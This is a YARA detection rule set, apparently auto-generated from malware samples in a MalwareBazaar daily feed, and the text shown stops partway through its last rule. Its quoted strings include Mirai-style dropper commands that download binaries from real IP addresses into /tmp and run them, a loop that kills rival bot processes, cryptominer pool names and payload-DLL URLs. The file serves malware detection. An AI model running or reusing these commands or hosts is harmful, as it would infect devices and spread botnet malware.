/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-09
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_03d231f7fa4fd382da3a64976a82defc1d310511e289b1742fe9cbbaf87f6fe1 {
   meta:
      description = "evidences - file 03d231f7fa4fd382da3a64976a82defc1d310511e289b1742fe9cbbaf87f6fe1.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "03d231f7fa4fd382da3a64976a82defc1d310511e289b1742fe9cbbaf87f6fe1"
   strings:
      $s1 = "cd /tmp; rm -rf 5; wget http://217.156.66.68/5; chmod 777 5; ./5 jaws.5; rm -rf 5;" fullword ascii
      $s2 = "cd /tmp; rm -rf 6; wget http://217.156.66.68/6; chmod 777 6; ./6 jaws.6; rm -rf 6;" fullword ascii
      $s3 = "cd /tmp; rm -rf 4; wget http://217.156.66.68/4; chmod 777 4; ./4 jaws.4 rm -rf 4;" fullword ascii
      $s4 = "cd /tmp; rm -rf 12; wget http://217.156.66.68/12; chmod 777 12; ./12 jaws.1; rm -rf 1;" fullword ascii
      $s5 = "cd /tmp; rm -rf 3; wget http://217.156.66.68/3; chmod 777 3; ./3 jaws.3; rm -rf 3;" fullword ascii
      $s6 = "cd /tmp; rm -rf 2; wget http://217.156.66.68/2; chmod 777 2; ./2 jaws.2; rm -rf 2;" fullword ascii
      $s7 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s8 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s9 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s10 = "rm -rf j" fullword ascii
      $s11 = "echo \"\" > j" fullword ascii
      $s12 = "            kill -9 \"$pid\"" fullword ascii
      $s13 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s14 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule ec48b857433dc1ec2f5f7e9d4a9c1c8995cbb614336cfc6b6ce67a5271288cc1 {
   meta:
      description = "evidences - file ec48b857433dc1ec2f5f7e9d4a9c1c8995cbb614336cfc6b6ce67a5271288cc1.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "ec48b857433dc1ec2f5f7e9d4a9c1c8995cbb614336cfc6b6ce67a5271288cc1"
   strings:
      $s1 = "cd /tmp; rm -rf 3; wget http://103.136.41.100/3; chmod 777 3; ./3 tvt.arm; rm -rf 3;" fullword ascii
      $s2 = "cd /tmp; rm -rf 2; wget http://103.136.41.100/2; chmod 777 2; ./2 tvt.mpsl; rm -rf 2;" fullword ascii
      $s3 = "cd /tmp; rm -rf 5; wget http://103.136.41.100/5; chmod 777 5; ./5 tvt.arm6; rm -rf 5;" fullword ascii
      $s4 = "cd /tmp; rm -rf 12; wget http://103.136.41.100/12; chmod 777 12; ./12 tvt.mips; rm -rf 1;" fullword ascii
      $s5 = "cd /tmp; rm -rf 6; wget http://103.136.41.100/6; chmod 777 6; ./6 tvt.arm7; rm -rf 6;" fullword ascii
      $s6 = "cd /tmp; rm -rf 4; wget http://103.136.41.100/4; chmod 777 4; ./4 tvt.arm5; rm -rf 4;" fullword ascii
      $s7 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s8 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s9 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s10 = "rm -rf tv.sh" fullword ascii
      $s11 = "echo \"\" > tv.sh" fullword ascii
      $s12 = "            kill -9 \"$pid\"" fullword ascii
      $s13 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s14 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_08e1c67d7ff174f7ebcb7c16ae27713710a63efddeea45fd835c0033b6e799c5 {
   meta:
      description = "evidences - file 08e1c67d7ff174f7ebcb7c16ae27713710a63efddeea45fd835c0033b6e799c5.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "08e1c67d7ff174f7ebcb7c16ae27713710a63efddeea45fd835c0033b6e799c5"
   strings:
      $s1 = "relogin.htm" fullword ascii
      $s2 = "User-Agent: curl/7.88.1" fullword ascii
      $s3 = "authkey" fullword ascii
      $s4 = "hostport=" fullword ascii
      $s5 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s6 = "Hash.Cookie" fullword ascii
      $s7 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s8 = "o?head-?ebs" fullword ascii
      $s9 = "GoAhead" fullword ascii
      $s10 = "\"OPSystemUpgrade\", \"Ret\" : 100" fullword ascii
      $s11 = "?ages/?ogin.htm" fullword ascii
      $s12 = "?ogin.rsp" fullword ascii
      $s13 = "pluginVersionTip" fullword ascii
      $s14 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s15 = "HTTPD_gw" fullword ascii
      $s16 = "cgi-bin/main-cgi" fullword ascii
      $s17 = "mini_httpd" fullword ascii
      $s18 = "doc/script" fullword ascii
      $s19 = "TKXGYKI" fullword ascii
      $s20 = "TOTOLINK" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4 {
   meta:
      description = "evidences - file 468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4"
   strings:
      $x1 = "file: [3] GetLastError: [2].Could not update resource for file: [3] GetLastError: [2].Could not set file time for file: [3] GetL" ascii
      $x2 = "it is properly registered and enabled.There is a problem with this Windows Installer package. A script required for this install" ascii
      $x3 = "ror: [3].Windows Installer cannot delete a system file protection catalog from the cache. Catalog: [2], Error: [3].Directory Man" ascii
      $x4 = "fied  ISCAReferenceFilePath. This column is only used by MSI.InstallingInstalledUninstallingDatabaseInstallTextStreamISSetupFile" ascii
      $x5 = "E.ISYourDataBaseDirDATABASEDIRISMyProductDirINSTALLDIRMYCOMP~1|My Company NameProgramFilesFolderISMyCompanyDirMYPROD~1|My Produc" ascii
      $x6 = "his particular version.Column to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;Language;Identifi" ascii
      $x7 = "inet file is corrupt.{ Error [3] was returned by WinVerifyTrust.}Failed to correctly copy [2] file: CRC error.Failed to correctl" ascii
      $x8 = "The integers do not have to be consecutive.BindImageFile_FileCCPSearchCheckBoxValueArgumentThe name of an other control on the s" ascii
      $x9 = "WCOPYRIGHT=\"No\"CopyrightInstallWelcomeSHOWCOPYRIGHT=\"Yes\"AgreeToLicense <> \"Yes\"NextLicenseAgreementAgreeToLicense = \"Yes" ascii
      $x10 = "c:\\codebases\\isdev\\src\\runtime\\installscript\\kernel\\TargetFile.h" fullword ascii
      $x11 = "ScrollableTextMemo{&MSSansBold8}Program MaintenanceChange which program features are installed. This option displays the Custom " ascii
      $x12 = "Click Finish to exit the wizard.&Yes, check for program updates (Recommended) after the setup completes.Setup has finished insta" ascii
      $x13 = "SetAllUsers.dll" fullword wide
      $x14 = "e failed.Executing the [2] view failed.Creating the window for the control [3] on dialog [2] failed.The handler failed in creati" ascii
      $s15 = "ine{&Tahoma8}InstallShieldBranding1You have chosen to remove the program from your system.Branding2ComboTextPushButton&Folder na" ascii
      $s16 = "in the user TEMP directory.ISNetAPI.dll is not loaded or there was an error loading the dll. This dll needs to be loaded for thi" ascii
      $s17 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii
      $s18 = "o that directory.Source file not found{{(cabinet)}}: [2].  Verify that the file exists and that you can access it.Cannot create " ascii
      $s19 = "returned: [2].Executing action [2] failed.Failed to create any [2] font on this system.For [2] textstyle, the system created a '" ascii
      $s20 = "WVERSION.dll" fullword wide
   condition:
      uint16(0) == 0xcfd0 and filesize < 28000KB and
      1 of ($x*) and all of them
}

rule sig_0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf {
   meta:
      description = "evidences - file 0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf"
   strings:
      $s1 = "execute once failure in __cxa_get_globals_fast()" fullword ascii
      $s2 = "mutex lock failed" fullword ascii
      $s3 = "mozilla/public-suffix-list.txt" fullword ascii
      $s4 = "_ZNSt6__ndk118condition_variable15__do_timed_waitERNS_11unique_lockINS_5mutexEEENS_6chrono10time_pointINS5_12system_clockENS5_8d" ascii
      $s5 = "_ZNSt6__ndk125notify_all_at_thread_exitERNS_18condition_variableENS_11unique_lockINS_5mutexEEE" fullword ascii
      $s6 = "_ZNSt6__ndk115__thread_struct25notify_all_at_thread_exitEPNS_18condition_variableEPNS_5mutexE" fullword ascii
      $s7 = "y<p>Create your personal account with us. Only a username, a password and an email address are required. We treat your details c" ascii
      $s8 = "_ZNSt6__ndk118condition_variable15__do_timed_waitERNS_11unique_lockINS_5mutexEEENS_6chrono10time_pointINS5_12system_clockENS5_8d" ascii
      $s9 = "__cxa_guard_acquire failed to acquire mutex" fullword ascii
      $s10 = "_ZN8SandHook17TrampolineManager17allocExecuteSpaceEm" fullword ascii
      $s11 = "__cxa_guard_abort failed to acquire mutex" fullword ascii
      $s12 = "_ZNSt6__ndk118condition_variable15__do_timed_waitERNS_11unique_lockINS_5mutexEEENS_6chrono10time_pointINS5_12system_clockENS5_8d" ascii
      $s13 = "_ZN8SandHook17TrampolineManager17allocExecuteSpaceEj" fullword ascii
      $s14 = "Enable dump mode" fullword ascii
      $s15 = "__cxa_guard_release failed to release mutex" fullword ascii
      $s16 = "__cxa_guard_acquire failed to release mutex" fullword ascii
      $s17 = "_ZN8SandHook10Trampoline15setExecuteSpaceEPh" fullword ascii
      $s18 = "__cxa_guard_abort failed to release mutex" fullword ascii
      $s19 = "BP_SHELLCODE_END" fullword ascii
      $s20 = "BP_SHELLCODE" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 26000KB and
      8 of them
}

rule sig_54da5d4894b911271565a32af73e2ef62391ecb5758508bd896b978780c6906e {
   meta:
      description = "evidences - file 54da5d4894b911271565a32af73e2ef62391ecb5758508bd896b978780c6906e.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "54da5d4894b911271565a32af73e2ef62391ecb5758508bd896b978780c6906e"
   strings:
      $s1 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s2 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s3 = "LOOKING FOR BINARY: %s PRESENT!!!" fullword ascii
      $s4 = "Fazer login com o Google" fullword ascii
      $s5 = "&&Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s6 = "++Base.Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s7 = "--Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s8 = "00RtlOverlay.Widget.AppCompat.Search.DropDown.Text" fullword ascii
      $s9 = ",,RtlOverlay.Widget.AppCompat.DialogTitle.Icon" fullword ascii
      $s10 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon1" fullword ascii
      $s11 = "Android (4691093 based on r316199) clang version 6.0.2 (https://android.googlesource.com/toolchain/clang 183abd29fc496f55536e7d9" ascii
      $s12 = "11Widget.AppCompat.Light.Spinner.DropDown.ActionBar" fullword ascii
      $s13 = "11Base.TextAppearance.AppCompat.Widget.DropDownItem" fullword ascii
      $s14 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon2" fullword ascii
      $s15 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Query" fullword ascii
      $s16 = "!!abc_action_bar_elevation_material" fullword ascii
      $s17 = "Installeer" fullword ascii /* base64 encoded string '"{-jY^z' */
      $s18 = "((Widget.AppCompat.CompoundButton.CheckBox" fullword ascii
      $s19 = "++Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s20 = "--Base.Widget.AppCompat.CompoundButton.CheckBox" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 25000KB and
      8 of them
}

rule sig_4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630 {
   meta:
      description = "evidences - file 4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630"
   strings:
      $s1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "hwloc/x86: Could not read dumped cpuid file %s, ignoring cpuiddump." fullword ascii
      $s3 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s4 = "get_payload_public_key" fullword ascii
      $s5 = "get_payload_private_key" fullword ascii
      $s6 = "e != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii
      $s7 = "nicehash.com" fullword ascii
      $s8 = "hwloc/x86: Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
      $s9 = "* hwloc %s received invalid information from the operating system." fullword ascii
      $s10 = "* along with the files generated by the hwloc-gather-topology script." fullword ascii
      $s11 = "%s: failed to identify memattr_value target object type %s" fullword ascii
      $s12 = "hwloc/x86: Couldn't find %x,%x,%x,%x in dumped cpuid, returning 0s." fullword ascii
      $s13 = "%s: IFUNC symbol '%s' referenced in '%s' is defined in the executable and creates an unsatisfiable circular dependency." fullword ascii
      $s14 = "cy == 0 || p.tmp[p.tmpsize - 1] < 20" fullword ascii
      $s15 = "hwloc/x86: Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s16 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii
      $s17 = "donate.ssl.xmrig.com" fullword ascii
      $s18 = "__pthread_mutex_unlock_usercnt" fullword ascii
      $s19 = "hwloc/x86: Ignoring invalid dirent `%s' in dumped cpuid directory `%s'" fullword ascii
      $s20 = "PTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 28000KB and
      8 of them
}

rule sig_50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f {
   meta:
      description = "evidences - file 50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f"
   strings:
      $s1 = "Unprocessable Content" fullword ascii
      $s2 = "::process_server_socket(const std::atomic<int>&, socket_t, size_t, time_t, time_t, time_t, time_t, time_t, T) [with T = httplib:" ascii
      $s3 = "ZN7httplib10ClientImpl15process_requestERNS_6StreamERNS_7RequestERNS_8ResponseEbRNS_5ErrorEEUlmmE1_" fullword ascii
      $s4 = ":Server::process_and_close_socket(socket_t)::<lambda(httplib::Stream&, bool, bool&)>; socket_t = int; size_t = long unsigned int" ascii
      $s5 = "bool httplib::detail::process_server_socket_core(const std::atomic<int>&, socket_t, size_t, time_t, T) [with T = httplib::detail" ascii
      $s6 = "ZN7httplib10ClientImpl15process_requestERNS_6StreamERNS_7RequestERNS_8ResponseEbRNS_5ErrorEEUlPKcmmmE_" fullword ascii
      $s7 = "bool httplib::detail::process_server_socket_core(const std::atomic<int>&, socket_t, size_t, time_t, T) [with T = httplib::detail" ascii
      $s8 = "ZN7httplib10ClientImpl15process_requestERNS_6StreamERNS_7RequestERNS_8ResponseEbRNS_5ErrorEEUlPKcmmmE0_" fullword ascii
      $s9 = "void nlohmann::json_abi_v3_11_3::detail::serializer<BasicJsonType>::dump_integer(NumberType) [with NumberType = long unsigned in" ascii
      $s10 = "void nlohmann::json_abi_v3_11_3::detail::serializer<BasicJsonType>::dump_integer(NumberType) [with NumberType = long int; typena" ascii
      $s11 = "void nlohmann::json_abi_v3_11_3::detail::serializer<BasicJsonType>::dump_integer(NumberType) [with NumberType = unsigned char; t" ascii
      $s12 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */
      $s13 = "ZN7httplib6detail24prepare_content_receiverINS_8ResponseEZNS0_12read_contentIS2_EEbRNS_6StreamERT_mRiSt8functionIFbmmEES9_IFbPKc" ascii
      $s14 = "ZN7httplib6detail21write_content_chunkedIZNS_6Server27write_content_with_providerERNS_6StreamERKNS_7RequestERNS_8ResponseERKSsSB" ascii
      $s15 = "ZZN7httplib6detail21write_content_chunkedIZNS_6Server27write_content_with_providerERNS_6StreamERKNS_7RequestERNS_8ResponseERKSsS" ascii
      $s16 = "ZN7httplib6Server12read_contentERNS_6StreamERNS_7RequestERNS_8ResponseEEUlRKNS_17MultipartFormDataEE0_" fullword ascii
      $s17 = "ZNK7httplib6Server17read_content_coreERNS_6StreamERNS_7RequestERNS_8ResponseESt8functionIFbPKcmEES7_IFbRKNS_17MultipartFormDataE" ascii
      $s18 = "ZN7httplib6detail24prepare_content_receiverINS_7RequestEZNS0_12read_contentIS2_EEbRNS_6StreamERT_mRiSt8functionIFbmmEES9_IFbPKcm" ascii
      $s19 = "ZN7httplib6detail21write_content_chunkedIZNKS_10ClientImpl27write_content_with_providerERNS_6StreamERKNS_7RequestERNS_5ErrorEEUl" ascii
      $s20 = "ZZN7httplib6detail21write_content_chunkedIZNKS_10ClientImpl27write_content_with_providerERNS_6StreamERKNS_7RequestERNS_5ErrorEEU" ascii
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      8 of them
}

rule ce9fefe17a09e0bbac993faaa2093fd0fa7ddab215f11c9e22c353999d5af71c {
   meta:
      description = "evidences - file ce9fefe17a09e0bbac993faaa2093fd0fa7ddab215f11c9e22c353999d5af71c.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "ce9fefe17a09e0bbac993faaa2093fd0fa7ddab215f11c9e22c353999d5af71c"
   strings:
      $s1 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii
      $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s3 = "F:\\restart\\restart\\Release\\restart.pdb" fullword ascii
      $s4 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii
      $s5 = "https://sectigo.com/CPS0" fullword ascii
      $s6 = "taskkill /f /im " fullword ascii
      $s7 = "9http://crt.sectigo.com/SectigoPublicTimeStampingCAR36.crt0#" fullword ascii
      $s8 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl05" fullword ascii
      $s9 = "9http://crl.sectigo.com/SectigoPublicTimeStampingCAR36.crl0z" fullword ascii
      $s10 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii
      $s11 = "http://ocsp.sectigo.com0" fullword ascii
      $s12 = "%Sectigo Public Time Stamping Root R46" fullword ascii
      $s13 = "%Sectigo Public Time Stamping Root R460" fullword ascii
      $s14 = "\\TempFolder" fullword ascii
      $s15 = " Type Descriptor'" fullword ascii
      $s16 = "'Sectigo Public Time Stamping Signer R350" fullword ascii
      $s17 = "http://subca.ocsp-certum.com02" fullword ascii
      $s18 = "\"http://cevcsca2021.ocsp-certum.com07" fullword ascii
      $s19 = "'Sectigo Public Time Stamping Signer R35" fullword ascii
      $s20 = "operator<=>" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule sig_100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb {
   meta:
      description = "evidences - file 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
   strings:
      $x1 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imgui_widgets.cpp" fullword wide
      $x2 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imgui.cpp" fullword wide
      $x3 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imgui_draw.cpp" fullword wide
      $x4 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imgui_impl_dx9.cpp" fullword wide
      $x5 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imgui_impl_win32.cpp" fullword wide
      $x6 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imgui_tables.cpp" fullword wide
      $x7 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imgui.h" fullword wide
      $x8 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imgui_internal.h" fullword wide
      $x9 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imstb_rectpack.h" fullword wide
      $x10 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\imgui\\imstb_truetype.h" fullword wide
      $x11 = "C:\\Users\\PC\\Desktop\\desktop\\ImGui-Loader-Base-master1\\Main.h" fullword wide
      $x12 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\exec.c" fullword wide
      $s13 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\compiler.c" fullword wide
      $s14 = "payload.DataFrameCount != -1" fullword wide
      $s15 = ".Copyright 2015 The Rubik Project AuthorsRubikRegular2.000;UKWN;Rubik-RegularRubik RegularVersion 2.000Rubik-RegularHubert & Fis" ascii
      $s16 = "LCopyright 2015 The Rubik Project AuthorsRubikRegular2.000;UKWN;Rubik-RegularRubik RegularVersion 2.000Rubik-RegularHubert & Fis" wide
      $s17 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\scan.c" fullword wide
      $s18 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\dotnet\\dotnet.c" fullword ascii
      $s19 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\string\\string.c" fullword ascii
      $s20 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\pe\\pe.c" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule sig_87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba {
   meta:
      description = "evidences - file 87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba"
   strings:
      $x1 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\exec.c" fullword wide
      $s2 = "E:\\Users\\JournalParser-main\\obj\\Release\\ConsoleApp14.pdb" fullword ascii
      $s3 = "C:\\Users\\PC\\source\\repos\\pcasvc\\x64\\Release\\pcasvc.pdb" fullword ascii
      $s4 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\compiler.c" fullword wide
      $s5 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\scan.c" fullword wide
      $s6 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\dotnet\\dotnet.c" fullword ascii
      $s7 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\string\\string.c" fullword ascii
      $s8 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\pe\\pe.c" fullword wide
      $s9 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\pe\\authenticode-parser\\countersignature.c" fullword wide
      $s10 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\object.c" fullword wide
      $s11 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\math\\math.c" fullword ascii
      $s12 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\console\\console.c" fullword ascii
      $s13 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\elf\\elf.c" fullword ascii
      $s14 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\tests\\tests.c" fullword wide
      $s15 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\cuckoo\\cuckoo.c" fullword wide
      $s16 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\pe\\authenticode-parser\\authenticode.c" fullword ascii
      $s17 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\modules\\time\\time.c" fullword ascii
      $s18 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\arena.c" fullword wide
      $s19 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\atoms.c" fullword wide
      $s20 = "C:\\Users\\PC\\Desktop\\yara-master\\libyara\\ahocorasick.c" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed1972a6 {
   meta:
      description = "evidences - file c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed1972a6.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "c1d42b7ea285fb930e1331a5e23c5e55e339e136a15fbee40a74b659ed1972a6"
   strings:
      $s1 = "get_kernel_syms" fullword ascii
      $s2 = "klogctl" fullword ascii
      $s3 = "getspnam" fullword ascii
      $s4 = "getspent" fullword ascii
      $s5 = "pmap_getport" fullword ascii
      $s6 = "getspent_r" fullword ascii
      $s7 = "getspnam_r" fullword ascii
      $s8 = "fgets_unlocked" fullword ascii
      $s9 = "fgetgrent_r" fullword ascii
      $s10 = "pmap_getmaps" fullword ascii
      $s11 = "fgetpwent_r" fullword ascii
      $s12 = "setspent" fullword ascii
      $s13 = "endspent" fullword ascii
      $s14 = "sigsetmask" fullword ascii
      $s15 = "swapoff" fullword ascii
      $s16 = "putpwent" fullword ascii
      $s17 = "clnt_pcreateerror" fullword ascii
      $s18 = "pivot_root" fullword ascii
      $s19 = "clnt_perror" fullword ascii
      $s20 = "authunix_create_default" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      8 of them
}

rule ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1 {
   meta:
      description = "evidences - file ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1"
   strings:
      $x1 = "C:\\Users\\chiquinho motoserra\\Desktop\\INTZ LOADER\\x64\\Release\\nemesis2.pdb" fullword ascii
      $s2 = "http://104.234.70.19/Steam.dll" fullword wide
      $s3 = "http://104.234.70.19/DLL.dll" fullword wide
      $s4 = "dhttps://scripts.sil.org/OFLThis Font Software is licensed under the SIL Open Font License, Version 1.1. This license is availab" wide
      $s5 = "Copyright 2016 The Mulish Project Authors (https://github.com/googlefonts/mulish)Mulish MediumRegular3.603;NONE;Mulish-MediumVer" wide
      $s6 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 6.0-c002 79.164488, 2020/07/" ascii
      $s7 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 6.0-c002 79.164488, 2020/07/" ascii
      $s8 = "VCRUNTIME140_1.dll" fullword ascii
      $s9 = "github.com" fullword wide
      $s10 = "xinput1_2.dll" fullword ascii
      $s11 = "xinput1_1.dll" fullword ascii
      $s12 = "blogger" fullword ascii
